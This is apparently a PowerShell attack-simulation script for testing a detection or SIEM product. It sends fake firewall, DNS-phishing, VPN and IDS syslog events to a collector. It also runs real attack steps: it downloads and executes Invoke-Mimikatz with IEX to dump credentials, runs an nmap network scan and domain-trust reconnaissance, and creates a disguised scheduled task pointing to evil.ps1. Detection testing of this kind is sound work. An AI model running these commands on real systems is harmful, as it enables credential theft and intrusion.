
#Set the IP of the IDR collector
#SET YOUR IP HERE!!!!!!!
param (
    [string]$Coll_IP,
    [string]$Instance_IP1,
    [string]$User_Account,
    [string]$ZoneName,
    [string]$DomainName,
    [string]$DomainNetbiosName,
    [string]$ServerName,
    [string]$PhishingName
    )
# Create a UDP Client Object
$UDPCLient = New-Object System.Net.Sockets.UdpClient
#Type of encoding that will be used for the syslog
$Encoding = [System.Text.Encoding]::ASCII
$Instance_IP2 = "10.16.187.80"
$Instance_IP3 = "10.1.66.102"

#User JT
    #Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="5.5.5.5"
    $Port="80"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP1,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 2

#Phishing log
    #Define the message    
    $URL="www.${ZoneName}"
    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP1 spt=53685 dhost=$URL destinationDnsDomain=$PhishingName dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    #Time format syslog understands
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 500
	
#User 2
#Firewall log
    #Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="5.5.5.5"
    $Port="80"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP2,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 2

#Phishing log
    #Define the message    
    $URL="www.${ZoneName}"
    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP2 spt=53685 dhost=$URL destinationDnsDomain=$PhishingName dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    #Time format syslog understands
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 500
#User 3
#Firewall log
    #Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="5.5.5.5"
    $Port="80"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP3,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)

#Phishing log
    #Define the message    
    $URL="www.${ZoneName}"

    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP3 spt=53685 dhost=$URL destinationDnsDomain=$PhishingName dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    #Time format syslog understands
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 500

#Mimikatz on JT
#Use this URL to get the best way to run this command:   
# https://atomicredteam.io/execution/T1059.001/
    #cmd /c "powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds 2>&1 | Out-Null
    #$DownloadExecute = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');"
    #$DownloadExecute = "IEX (New-Object Net.WebClient).DownloadString('cInvoke-Mimikatz.ps1');
    
    $DownloadExecute = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1');"
    Start-Process cmd.exe "/c powershell.exe $DownloadExecute Invoke-Mimikatz -DumpCreds"
    Sleep 2000

#Multi country auth
	$Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="5.182.39.91"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,016301003146,GLOBALPROTECT,0,2305,$Timestamp2,vsys1,gateway-connected,connected,,IPSec,$User_Account,PT,LS,$IP,0.0.0.0,$Instance_IP1,0.0.0.0,58d51966-4fc0-4009-93d9-a4fe2da630dd,$ServerName,5.2.3,Windows,'Microsoft Windows 11 Enterprise , 64-bit',1,,,"",success,,0,,0,ClientVPN,6936960,0x0"
	# Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    sleep 20	
	
	
    #Define the message for normal VPN
	#Multi country auth for JT
	$Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="66.112.245.0"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,016301003146,GLOBALPROTECT,0,2305,$Timestamp2,vsys1,gateway-connected,connected,,IPSec,$User_Account,US,TX,$IP,0.0.0.0,$Instance_IP1,0.0.0.0,58d51966-4fc0-4009-93d9-a4fe2da630dd,$ServerName,5.2.3,Windows,'Microsoft Windows 10 Enterprise , 64-bit',1,,,"",success,,0,,0,ClientVPN,6936960,0x0"
	# Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    sleep 50	
	
#Network scan
    #nmap.exe -sV -T4 -O -F --version-light 10.0.14.0/24
    C:'\Program Files (x86)'\Nmap\nmap.exe -T4 -O -F --version-light 10.0.14.0/24

Sleep -s 300

#User Ahsoka
#IDS log
	$Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="83.79.122.192"
	$Port= "3389"
	$FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,THREAT,spyware,7,$Timestamp2,$Instance_IP1,$IP,,,General Business Apps,$User_Account,,unknown-udp,vsys1,Z1,Z1,ethernet1/2,ethernet1/2,default,$Timestamp2,692753,1,55702,3389,0,0,0x80002000,udp,drop,,ZeroAccess.Gen Command and Control Traffic(13235),any,critical,client-to-server,5018949673,0x2000000000000000,10.0.0.0-10.255.255.255,Switzerland,0,,1206033490526331539,,,0,,,,,,,,0,31,43,0,0,,us3,,,,,0,,0,,N/A,botnet,AppThreat-8252-6025,0x0,0,4294967295,,,08079437-0ef0-42ab-9a4b-f9095df3a655,0"
	# Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
	
	
	
    cmd.exe /c "nltest /domain_trusts"
    cmd.exe /c 'net group "domain Controllers" /domain'

    sleep -s 30

    powershell -Command "Start-Process -FilePath schtasks -ArgumentList '/Create','/SC','daily','/TN','MicrosoftEdgeUpdateTask', '/TR','c:\users\ahsoka\appdata\roaming\evil.ps1', '/ST', '11:00'"

    sleep -s 30

    powershell -Command "Start-Process -FilePath schtasks -ArgumentList '/Delete', '/TN', 'MicrosoftEdgeUpdateTask', '/F'"
